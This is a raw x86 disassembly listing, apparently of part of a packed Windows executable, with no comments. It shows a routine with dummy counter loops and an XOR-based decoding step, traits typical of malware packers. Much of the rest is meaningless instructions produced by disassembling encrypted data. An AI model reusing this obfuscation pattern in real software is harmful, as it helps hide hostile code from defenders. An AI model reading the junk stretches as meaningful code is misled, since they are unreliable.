  410187:	push   edi
  410188:	loop   0x41016a
  41018a:	(bad)  
  41018b:	cmp    BYTE PTR [ebx+0x77770c19],cl
  410191:	ins    BYTE PTR es:[edi],dx
  410192:	pop    eax
  410193:	out    dx,al
  410194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410195:	imul   ebp,DWORD PTR [esi+0xf],0x2c
  410199:	addr16 mov cl,0xb6
  41019c:	sbb    al,0x72
  41019e:	fmulp  st(5),st
  4101a0:	mov    gs,WORD PTR [ecx]
  4101a2:	mov    esi,0x2dfd057
  4101a7:	mov    BYTE PTR [edx+0x26],bl
  4101aa:	push   0xfb3f7d3a
  4101af:	sub    edx,DWORD PTR [edi+0x5a]
  4101b2:	int3   
  4101b3:	inc    edx
  4101b4:	mov    al,0xc1
  4101b6:	dec    esp
  4101b7:	add    al,0x8
  4101b9:	inc    esi
  4101ba:	mov    edi,ss
  4101bc:	popf   
  4101bd:	lea    ebx,gs:[eax]
  4101c0:	xchg   ecx,eax
  4101c1:	add    esi,ebx
  4101c3:	aaa    
  4101c4:	call   0xe160:0xb398e462
  4101cb:	or     BYTE PTR [edi],dh
  4101cd:	xchg   esi,eax
  4101ce:	pop    edi
  4101cf:	inc    esi
  4101d0:	pop    esp
  4101d1:	mov    ah,0x58
  4101d3:	xor    bh,dl
  4101d5:	sub    DWORD PTR [esi+0x649386f4],ebp
  4101db:	icebp  
  4101dc:	cdq    
  4101dd:	aaa    
  4101de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101df:	xor    al,0xbc
  4101e1:	retf   
  4101e2:	mov    ecx,0xd4e5c867
  4101e7:	sub    BYTE PTR [ebx-0x377e68dd],bh
  4101ed:	mov    cl,0x78
  4101ef:	mov    esi,0x4b8d4b47
  4101f4:	cli    
  4101f5:	adc    eax,0x25b772e
  4101fa:	sbb    BYTE PTR [ebx],bl
  4101fc:	movq   mm2,QWORD PTR [edi+esi*8+0x104d8bf1]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43381f
  41021e:	adc    DWORD PTR ds:0x433857,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43378b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4338ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43385f
  41026b:	or     DWORD PTR ds:0x433857,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43382b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43382b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43382b,ecx
  410291:	cmp    DWORD PTR ds:0x43382b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43382b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43382b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43382b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43382b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433783
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433867,0x43381f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433863,0x433817
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4337d7
  41031a:	sub    DWORD PTR ds:0x43379f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4337db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4337db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4337db,ecx
  410345:	cmp    DWORD PTR ds:0x4337db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43392f
  410357:	push   0x43396f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4337db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43381f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433893,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433893
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433893,ecx
  41038f:	cmp    DWORD PTR ds:0x433893,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433867
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433893,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433893
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433893,ecx
  4103c8:	cmp    DWORD PTR ds:0x433893,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4337df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4337d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4337d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4337d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4337d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4337d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xb5,al
  41049c:	ins    BYTE PTR es:[edi],dx
  41049d:	push   edi
  41049e:	xchg   ebx,eax
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	pushf  
  4104a8:	fidivr DWORD PTR [esi+0x26]
  4104ab:	jl     0x41050d
  4104ad:	mov    ebp,0xc66ef241
  4104b2:	test   DWORD PTR [ebx-0x5ba4bef2],ebx
  4104b8:	in     eax,dx
  4104b9:	jmp    0x5e3c:0x72e47c01
  4104c0:	jp     0x41053c
  4104c2:	push   ebp
  4104c3:	xchg   ecx,eax
  4104c4:	stos   DWORD PTR es:[edi],eax
  4104c5:	lahf   
  4104c6:	mov    ebx,0xaf40312c
  4104cb:	add    bl,BYTE PTR [edi+0x65]
  4104ce:	fild   DWORD PTR [edi*1+0x3a241489]
  4104d5:	out    0xe6,eax
  4104d7:	mov    eax,0xe82e3d0c
  4104dc:	and    dl,BYTE PTR [bx+si-0x684d]
  4104e1:	mov    WORD PTR [edi+0x4c26fceb],es
  4104e7:	push   edi
  4104e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104ea:	(bad)  
  4104eb:	or     cl,cl
  4104ed:	add    dh,bl
  4104ef:	int    0xf4
  4104f1:	pop    ecx
  4104f2:	sti    
  4104f3:	test   al,0xe4
  4104f5:	aad    0x78
  4104f7:	jecxz  0x4104be
  4104f9:	xchg   edx,eax
  4104fa:	sub    DWORD PTR [esi+0x4e],0xffffffbc
  4104fe:	jne    0x410504
  410500:	shl    esp,0xa3
  410503:	fcmovne st,st(6)
  410505:	push   0xa26179be
  41050a:	in     al,0x33
  41050c:	imul   esp,DWORD PTR [eax-0xd7a7c99],0xffffffa4
  410513:	mov    edi,0xa4ece6aa
  410518:	sub    BYTE PTR ds:0xe4f94170,ch
  41051e:	jo     0x410577
  410520:	pop    eax
  410521:	mov    al,0x4e
  410523:	xor    al,0xbf
  410525:	xchg   esi,eax
  410526:	imul   edi,DWORD PTR cs:[ebp-0x29b93963],0x7f
  41052e:	mov    edi,0xc8fa489b
  410533:	pop    esp
  410534:	xchg   ebp,eax
  410535:	test   BYTE PTR [edx-0x27],bh
  410538:	test   al,0xca
  41053a:	add    ch,BYTE PTR [eax+0x56]
  41053d:	mov    al,ds:0xaf264726
  410542:	push   0x22
  410544:	jb     0x4104e7
  410546:	shl    ecx,1
  410548:	fidivr WORD PTR [ecx+edx*4-0xe3a5748]
  41054f:	push   ebp
  410550:	mov    ds:0x5bc1f267,eax
  410555:	enter  0x77e8,0x91
  410559:	jecxz  0x4105cd
  41055b:	pop    eax
  41055c:	imul   edi,DWORD PTR [edx-0x80],0x24438239
  410563:	xchg   edx,eax
  410564:	rol    DWORD PTR [edi],1
  410566:	mov    edx,0xe5d96571
  41056b:	call   0x3961dd5
  410570:	push   edi
  410571:	sahf   
  410572:	dec    ebx
  410573:	scas   eax,DWORD PTR es:[edi]
  410574:	js     0x410537
  410576:	nop
  410577:	stc    
  410578:	aas    
  410579:	inc    DWORD PTR cs:[esi+0x646f57ac]
  410580:	cmp    DWORD PTR [ebp+0x15],esp
  410583:	inc    DWORD PTR [edi+0x7fafada]
  410589:	cmp    BYTE PTR [ebx+0x7d6bac9d],bh
  41058f:	add    edi,DWORD PTR ds:0xe49ea143
  410595:	sbb    eax,0x6f2b499e
  41059a:	es push eax
  41059c:	jge    0x4105b9
  41059e:	fnstenv [ebp-0x24e56d46]
  4105a4:	pusha  
  4105a5:	cmp    al,0xfb
  4105a7:	sub    ebp,esi
  4105a9:	lds    ecx,FWORD PTR [edi+0x76c8fcbc]
  4105af:	out    dx,eax
  4105b0:	je     0x4105c5
  4105b2:	cmp    eax,0x63b7f8d3
  4105b7:	mov    ebx,0x6b921625
  4105bc:	inc    esi
  4105bd:	push   esp
  4105be:	mov    edi,0x65659943
  4105c3:	iret   
  4105c4:	and    al,0x3
  4105c6:	xor    cl,BYTE PTR [edx-0x59]
  4105c9:	mov    BYTE PTR [esp+ebx*4],bh
  4105cc:	inc    edx
  4105cd:	xor    BYTE PTR [ecx],dh
  4105cf:	popf   
  4105d0:	shl    BYTE PTR [edi+0x10],0x3e
  4105d4:	ret    
  4105d5:	daa    
  4105d6:	fstp   QWORD PTR [edi+ecx*1-0x25043b37]
  4105dd:	mov    ah,0xb5
  4105df:	mov    eax,ds:0xcf2ba2f
  4105e4:	add    eax,0xbdf8d861
  4105e9:	outs   dx,BYTE PTR ds:[esi]
  4105ea:	dec    ebp
  4105eb:	jmp    0x4105b3
  4105ed:	fcmovbe st,st(3)
  4105ef:	ret    0x860a
  4105f2:	test   BYTE PTR [edi-0x2d7b37aa],dh
  4105f8:	xor    edi,DWORD PTR [edi+0x7163cd2c]
  4105fe:	sub    DWORD PTR [eax],ebp
  410600:	out    0xce,eax
  410602:	lods   al,BYTE PTR ds:[esi]
  410603:	inc    edx
  410604:	cmp    cl,bl
  410606:	ja     0x4105b9
  410608:	xchg   ecx,eax
  410609:	xor    al,0x12
  41060b:	sbb    eax,0xcc606690
  410610:	(bad)  
  410611:	mov    esi,cs
  410613:	lods   al,BYTE PTR ds:[esi]
  410614:	mov    ebp,0xd8ca2e5a
  410619:	aam    0x56
  41061b:	into   
  41061c:	pcmpeqb mm7,QWORD PTR [ebp+0x15]
  410620:	or     DWORD PTR [ecx],esi
  410622:	sti    
  410623:	leave  
  410624:	rcl    BYTE PTR [eax+0x1a],1
  410627:	cmp    al,0x22
  410629:	addr16 adc eax,0x8b1e97ea
  41062f:	shr    BYTE PTR [esi+0x56a3e0b9],0x5d
  410636:	cmp    BYTE PTR [ecx],bl
  410638:	lds    ebx,FWORD PTR [edi-0x7b80666b]
  41063e:	out    dx,al
  41063f:	push   ds
  410640:	inc    ecx
  410641:	jle    0x410692
  410643:	fst    DWORD PTR [esi+0x42]
  410646:	imul   edx,DWORD PTR [esi+eiz*4+0x3632801c],0xffffffbf
  41064e:	cld    
  41064f:	xchg   DWORD PTR [eax],edx
  410651:	arpl   WORD PTR [ebx],ax
  410653:	push   cs
  410654:	add    esi,DWORD PTR [ebp-0xc944371]
  41065a:	sbb    BYTE PTR [eax],ah
  41065c:	or     BYTE PTR [eax+0x18c8aea5],al
  410662:	aaa    
  410663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410664:	fwait
  410665:	std    
  410666:	retf   0xd7df
  410669:	lods   al,BYTE PTR ds:[esi]
  41066a:	jmp    0xdc3d:0xe3b3e12b
  410671:	pop    ecx
  410672:	les    eax,FWORD PTR [esi-0x57]
  410675:	mov    ds:0xb18ad29f,al
  41067a:	pop    eax
  41067b:	mov    esi,esi
  41067d:	das    
  41067e:	push   ebp
  41067f:	shl    DWORD PTR [edx],0xd4
  410682:	popf   
  410683:	xor    DWORD PTR [edx-0x2b45d8c8],ebp
  410689:	inc    DWORD PTR [esi+0x60]
  41068c:	ficom  WORD PTR ds:0x332d419
  410692:	xchg   ecx,ebx
  410694:	push   ecx
  410695:	and    DWORD PTR [edx+0x60c3327a],ebp
  41069b:	sub    BYTE PTR ds:0xad4f9d1f,dh
  4106a1:	dec    edi
  4106a2:	mov    dh,0xf0
  4106a4:	mov    bl,0xc6
  4106a6:	mov    bh,0xa
  4106a8:	ins    BYTE PTR es:[edi],dx
  4106a9:	scas   eax,DWORD PTR es:[edi]
  4106aa:	imul   esi,DWORD PTR [eax],0x44349a72
  4106b0:	and    ecx,ebx
  4106b2:	jle    0x410717
  4106b4:	ins    BYTE PTR es:[edi],dx
  4106b5:	les    eax,FWORD PTR cs:[esi+0x44]
  4106b9:	mov    dl,0x2a
  4106bb:	mov    eax,DWORD PTR [ebp+0x33af569e]
  4106c1:	cmp    al,0xf0
  4106c3:	sub    al,BYTE PTR [ecx-0x25]
  4106c6:	fist   DWORD PTR [edi]
  4106c8:	and    ebx,DWORD PTR [esi-0x19]
  4106cb:	dec    esi
  4106cc:	addr16 loop 0x410669
  4106cf:	dec    ebx
  4106d0:	in     eax,0x19
  4106d2:	or     al,0xfb
  4106d4:	fwait
  4106d5:	cmp    eax,0xa7f1a442
  4106da:	pop    es
  4106db:	or     ah,BYTE PTR [ebp-0x30d741b5]
  4106e1:	jae    0x4106d9
  4106e3:	jmp    0x63c4:0x97cc47bc
  4106ea:	retf   
  4106eb:	fyl2x  
  4106ed:	aaa    
  4106ee:	ss push ds
  4106f0:	or     ah,BYTE PTR es:[eax+edx*4-0x37]
  4106f5:	clc    
  4106f6:	inc    esi
  4106f7:	out    0xaf,al
  4106f9:	jmp    0x4106bd
  4106fb:	jecxz  0x4106d6
  4106fd:	inc    ebp
  4106fe:	bnd call 0x1c424582
  410704:	inc    esi
  410705:	jg     0x4106ef
  410707:	xor    eax,0xf4eee84f
  41070c:	(bad)  
  41070d:	test   BYTE PTR [bx-0x2f],ah
  410711:	cmc    
  410712:	pop    edx
  410713:	jno    0x41072e
  410715:	popa   
  410716:	xchg   esi,eax
  410717:	fnstsw WORD PTR [edx-0x6ec94344]
  41071d:	inc    esi
  41071e:	in     eax,dx
  41071f:	mov    dl,0x13
  410721:	dec    ecx
  410722:	es inc edi
  410724:	cmp    DWORD PTR [edi],edi
  410726:	pop    ss
  410727:	mov    ah,0xe1
  410729:	(bad)  
  41072a:	ins    DWORD PTR es:[edi],dx
  41072b:	das    
  41072c:	scas   al,BYTE PTR es:[edi]
  41072d:	cmp    edi,DWORD PTR [ecx-0x78]
  410730:	shl    DWORD PTR [esi-0x5f],cl
  410733:	xor    eax,0xcc845851
  410738:	retw   0xf004
  41073c:	bound  ecx,QWORD PTR [ebp-0x5b]
  41073f:	jmp    0xf4f7:0x15225724
  410746:	push   edi
  410747:	icebp  
  410748:	jge    0x410785
  41074a:	xor    BYTE PTR [ebp-0x65],ah
  41074d:	pop    esp
  41074e:	fidivr WORD PTR [eax]
  410750:	jns    0x4106da
  410752:	pop    eax
  410753:	or     ebx,DWORD PTR [eax-0x5d]
  410756:	jmp    0xf4869285
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x36262b93
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410800
  41078c:	xchg   DWORD PTR [ebp-0x2e],ebx
  41078f:	inc    edi
  410790:	inc    esi
  410791:	ds pop edi
  410793:	in     al,dx
  410794:	enter  0x9c3f,0x4f
  410798:	in     al,dx
  410799:	rcl    DWORD PTR [eax-0x1c],cl
  41079c:	mul    ebx
  41079e:	xor    al,0xb
  4107a0:	(bad)  
  4107a1:	jae    0x410727
  4107a3:	aam    0xec
  4107a5:	adc    DWORD PTR [edi+edx*8-0x51ddf24f],ebx
  4107ac:	test   al,0x96
  4107ae:	inc    ebx
  4107af:	in     eax,0x56
  4107b1:	test   eax,0xa91fe6b4
  4107b6:	rcl    BYTE PTR [esi+edx*4],0x96
  4107ba:	aas    
  4107bb:	add    BYTE PTR [ecx+0x3c],al
  4107be:	xchg   BYTE PTR [eax-0x152d3e6a],cl
  4107c4:	enter  0x9585,0x46
  4107c8:	or     bl,BYTE PTR [edx-0x4d9fc76]
  4107ce:	mov    al,ds:0x10dce4cc
  4107d3:	jmp    0x9e6d:0x80ec143f
  4107da:	loopne 0x410775
  4107dc:	add    DWORD PTR [ebx+0x3cbb99fe],ecx
  4107e2:	leave  
  4107e3:	or     ch,BYTE PTR [esp+edi*1+0x2630b417]
  4107ea:	fdivr  QWORD PTR [ebx-0x6e]
  4107ed:	add    esp,eax
  4107ef:	(bad)  
  4107f0:	cmova  ecx,DWORD PTR [ecx-0x69fa7170]
  4107f7:	jg     0x41078a
  4107f9:	push   esp
  4107fa:	jmp    0x9fdd7940
  4107ff:	stos   DWORD PTR es:[edi],eax
  410800:	in     eax,dx
  410801:	and    edi,DWORD PTR [edi+0x19850f36]
  410807:	in     eax,dx
  410808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410809:	jmp    0x4107df
  41080b:	sbb    DWORD PTR [edx],esp
  41080d:	mov    edi,0xf987f7a4
  410812:	push   esi
  410813:	test   al,0x77
  410815:	mov    dl,bh
  410817:	push   esi
  410818:	sahf   
  410819:	sub    BYTE PTR [edi-0x72f658c5],dl
  41081f:	jl     0x4107bd
  410821:	fiadd  DWORD PTR [edi]
  410823:	mov    bl,0x43
  410825:	cdq    
  410826:	mov    WORD PTR [edx],ss
  410828:	push   es
  410829:	div    ebx
  41082b:	pop    edi
  41082c:	sbb    ch,0xca
  41082f:	lods   al,BYTE PTR ds:[esi]
  410830:	pop    edx
  410831:	les    ebp,FWORD PTR ds:0x39f2e336
  410837:	std    
  410838:	addr16 inc ebp
  41083a:	mov    WORD PTR ds:0xe7e78a00,ss
  410840:	xchg   esp,eax
  410841:	ins    DWORD PTR es:[edi],dx
  410842:	popa   
  410843:	mov    DWORD PTR [ecx-0x29f3a19c],ebx
  410849:	dec    ebp
  41084a:	out    0xdc,al
  41084c:	push   edi
  41084d:	xchg   ebp,eax
  41084e:	cmp    al,dl
  410850:	mov    ch,0xe7
  410852:	in     al,0x3e
  410854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410855:	pop    ds
  410856:	adc    eax,0x38a574b5
  41085b:	mov    bh,0x49
  41085d:	(bad)  
  41085e:	clc    
  41085f:	lahf   
  410860:	dec    ebx
  410861:	xchg   cx,ax
  410863:	mov    ebp,0x2cfdd33
  410868:	mov    bl,0x84
  41086a:	outs   dx,BYTE PTR ds:[esi]
  41086b:	push   esp
  41086c:	jmp    0x410807
  41086e:	ss idiv esi
  410871:	mov    dh,BYTE PTR [ecx+eiz*1]
  410874:	stos   BYTE PTR es:[edi],al
  410875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410876:	mov    ds:0xadcc7f00,al
  41087b:	adc    edi,DWORD PTR [eax-0x72]
  41087e:	mov    edi,0x4898338a
  410883:	test   BYTE PTR [ebp-0x7482313a],dl
  410889:	add    eax,ebp
  41088b:	fdivr  st,st(2)
  41088d:	jbe    0x41084f
  41088f:	sti    
  410890:	xchg   esp,eax
  410891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410892:	fmul   DWORD PTR ss:[edx]
  410895:	arpl   WORD PTR [edx-0x17af24a5],sp
  41089b:	pop    es
  41089c:	stc    
  41089d:	clc    
  41089e:	sub    eax,0xf8c14f4d
  4108a3:	xor    esi,ebp
  4108a5:	pop    esi
  4108a6:	in     eax,dx
  4108a7:	ret    0xd3c3
  4108aa:	mov    ah,0x9a
  4108ac:	dec    ebp
  4108ad:	mov    ch,BYTE PTR [ebp+0x66a4aff2]
  4108b3:	addr16 sub esp,ecx
  4108b6:	mov    ds:0xdc8da60f,al
  4108bb:	push   ebx
  4108bc:	jb     0x410861
  4108be:	xlat   BYTE PTR ds:[ebx]
  4108bf:	inc    esp
  4108c0:	retf   0x5db2
  4108c3:	fwait
  4108c4:	lds    ebp,FWORD PTR [edx+0x5]
  4108c7:	jnp    0x4108dc
  4108c9:	adc    eax,0x17291706
  4108ce:	fcomp  QWORD PTR [edi+eiz*4]
  4108d1:	inc    ebx
  4108d2:	fadd   st(1),st
  4108d4:	lds    eax,FWORD PTR [edx-0x3a]
  4108d7:	lea    ebp,[esi]
  4108d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108da:	pop    edx
  4108db:	aaa    
  4108dc:	cmp    DWORD PTR [edx],ecx
  4108de:	aas    
  4108df:	outs   dx,BYTE PTR ds:[esi]
  4108e0:	repnz dec BYTE PTR [edi-0x61b643a5]
  4108e7:	ret    0xb4f1
  4108ea:	jno    0x4108e0
  4108ec:	cwde   
  4108ed:	cmp    eax,0xd4707beb
  4108f2:	jae    0x4108be
  4108f4:	add    BYTE PTR gs:[edx-0x8],ch
  4108f8:	repz xchg ebp,eax
  4108fa:	mov    cl,0x4f
  4108fc:	push   esp
  4108fd:	fbld   TBYTE PTR [edx+0x7438dfde]
  410903:	pop    esi
  410904:	cs pusha 
  410906:	sbb    DWORD PTR [ebp-0x17238ba5],esp
  41090c:	add    cl,BYTE PTR ds:0x4e869f61
  410912:	cmp    eax,0xb7696063
  410917:	mov    ebx,0xee942f8c
  41091c:	ja     0x4108bb
  41091e:	jle    0x410944
  410920:	dec    edi
  410921:	repz mov dh,0x7f
  410924:	cdq    
  410925:	arpl   WORD PTR [esi+esi*1],di
  410928:	jo     0x4108ee
  41092a:	jge    0x4108ba
  41092c:	dec    eax
  41092d:	and    eax,0x9614d148
  410932:	lods   al,BYTE PTR ds:[esi]
  410933:	xchg   edi,eax
  410934:	pop    edx
  410935:	mov    bl,0x86
  410937:	inc    ebx
  410938:	lds    esi,FWORD PTR [esi+0x58e763d3]
  41093e:	mov    al,0x70
  410940:	fidivr WORD PTR [ecx-0x3de81dbd]
  410946:	gs cmc 
  410948:	int    0x57
  41094a:	ds xor eax,0xdfaa348e
  410950:	sahf   
  410951:	std    
  410952:	xchg   esp,eax
  410953:	jae    0x410934
  410955:	sar    BYTE PTR [esi-0x8],cl
  410958:	std    
  410959:	jl     0x410944
  41095b:	inc    edx
  41095c:	(bad)  
  41095d:	lahf   
  41095e:	jmp    0x4109b3
  410960:	mov    dl,0xd7
  410962:	dec    ebx
  410963:	and    al,0x49
  410965:	mov    cl,0x71
  410967:	je     0x410966
  410969:	jmp    0x41096f
  41096b:	sub    BYTE PTR [ebp-0x4d1d3cb],dl
  410971:	stc    
  410972:	fsubr  st,st(6)
  410974:	ficomp WORD PTR [edi]
  410976:	or     ebp,DWORD PTR [edx+0xc]
  410979:	ret    0xc744
  41097c:	repz add al,0x40
  41097f:	outs   dx,DWORD PTR ds:[esi]
  410980:	mov    edx,0xb294e56a
  410985:	std    
  410986:	mov    bh,0xb3
  410988:	ins    BYTE PTR es:[edi],dx
  410989:	jle    0x41098f
  41098b:	out    0x27,eax
  41098d:	addr16 pop ecx
  41098f:	and    DWORD PTR [esi-0x6e5885d6],esi
  410995:	sahf   
  410996:	pop    ebp
  410997:	mov    ah,0x32
  410999:	xlat   BYTE PTR ds:[ebx]
  41099a:	jns    0x4109bc
  41099c:	test   eax,0x7b042b1d
  4109a1:	push   es
  4109a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109a3:	enter  0x47a0,0x4b
  4109a7:	add    edx,DWORD PTR [eax-0x2e17b9f4]
  4109ad:	scas   al,BYTE PTR es:[edi]
  4109ae:	pop    eax
  4109af:	les    edi,FWORD PTR [ebp-0x3046abb0]
  4109b5:	dec    ebp
  4109b6:	ins    DWORD PTR es:[edi],dx
  4109b7:	mov    BYTE PTR ss:[ecx-0x35],dh
  4109bb:	daa    
  4109bc:	push   edx
  4109bd:	arpl   dx,dx
  4109bf:	mov    ecx,0x7a78f007
  4109c4:	cmc    
  4109c5:	mov    WORD PTR [ecx],cs
  4109c7:	mov    bh,0x4
  4109c9:	cmp    edi,edi
  4109cb:	stc    
  4109cc:	ins    BYTE PTR es:[edi],dx
  4109cd:	inc    ebx
  4109ce:	mov    bl,0x77
  4109d0:	lahf   
  4109d1:	ja     0x41097a
  4109d3:	test   al,0xe
  4109d5:	xchg   esi,eax
  4109d6:	test   DWORD PTR [edx+0x44],ecx
  4109d9:	retf   
  4109da:	call   0x8ba2:0x8c6d22bd
  4109e1:	add    bl,BYTE PTR [ebp-0x4e]
  4109e4:	dec    ecx
  4109e5:	jle    0x410a54
  4109e7:	or     eax,DWORD PTR [eax+0x5a]
  4109ea:	and    eax,0x8a71a84b
  4109ef:	shl    BYTE PTR [edi+0x56],1
  4109f2:	aas    
  4109f3:	jg     0x410a10
  4109f5:	outs   dx,DWORD PTR ds:[esi]
  4109f6:	gs add esp,edx
  4109f9:	push   ecx
  4109fa:	cmp    DWORD PTR [edx],esp
  4109fc:	ror    esi,1
  4109fe:	push   0xffffffa2
  410a00:	inc    esi
  410a01:	pop    esi
  410a02:	int    0xb1
  410a04:	lods   al,BYTE PTR ds:[esi]
  410a05:	add    edx,0x43df2b
  410a0b:	rcl    DWORD PTR [edi-0xa56b99a],1
  410a11:	lods   eax,DWORD PTR ds:[esi]
  410a12:	jns    0x4109e4
  410a14:	outs   dx,DWORD PTR ds:[esi]
  410a15:	hlt    
  410a16:	dec    esi
  410a17:	leave  
  410a18:	jne    0x4109ea
  410a1a:	mov    dh,0x3b
  410a1c:	mov    ebp,DWORD PTR [ecx+0x25]
  410a1f:	mov    ebp,0x45966c3e
  410a24:	push   0xffffff9e
  410a26:	rcl    DWORD PTR [edx],1
  410a28:	and    al,0x53
  410a2a:	nop
  410a2b:	cmp    ah,BYTE PTR [ebx]
  410a2d:	cmp    DWORD PTR [ebp-0x6b],ebp
  410a30:	int    0x5b
  410a32:	cli    
  410a33:	aas    
  410a34:	push   edx
  410a35:	fldcw  WORD PTR [ecx+ebp*8]
  410a38:	hlt    
  410a39:	addr16 imul ecx
  410a3c:	add    eax,esi
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	mov    ds:0xba6331a1,al
